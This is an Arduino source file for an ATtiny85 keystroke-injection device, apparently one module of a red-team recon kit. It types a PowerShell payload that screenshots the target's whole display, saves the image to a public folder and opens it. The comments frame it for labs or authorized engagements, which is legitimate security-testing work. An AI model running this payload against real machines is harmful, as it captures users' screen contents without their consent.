// recon/screenshot - Tier 2
//
// Captures the screen to a PNG and opens it.
//
// This one writes an image of whatever the user is looking at, which is
// closer to collection than reconnaissance. Included because it is the
// standard way to answer 'what is on this screen right now' during an
// engagement - in a lab, on your own machine, or with written permission.
//
// Read-only, no persistence, nothing left behind except the text file named in
// R_OUT. Output lands in C:\Users\Public\ds-recon\ on the target.

#include <duck.h>

// PROGMEM: this string must live in flash, not SRAM. The ATtiny85 has 512
// bytes of RAM and this script is far larger than that.
static const char S[] PROGMEM =
    R_MKDIR
    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing"
    "$b=[Windows.Forms.SystemInformation]::VirtualScreen"
    "$bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height"
    "$g=[System.Drawing.Graphics]::FromImage($bmp)"
    "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size)"
    "$bmp.Save('C:\\Users\\Public\\ds-recon\\screen.png',[System.Drawing.Imaging.ImageFormat]::Png)"
    "$g.Dispose();$bmp.Dispose()"
    "Invoke-Item 'C:\\Users\\Public\\ds-recon\\screen.png'"
    R_OUT("screenshot.txt")
    R_SHOW("screenshot.txt");

void setup() {
  duckBegin();
  ledPulse(2, 120, 120);
  recon(S);
  ledPulse(4, 150, 150);
}

void loop() {}
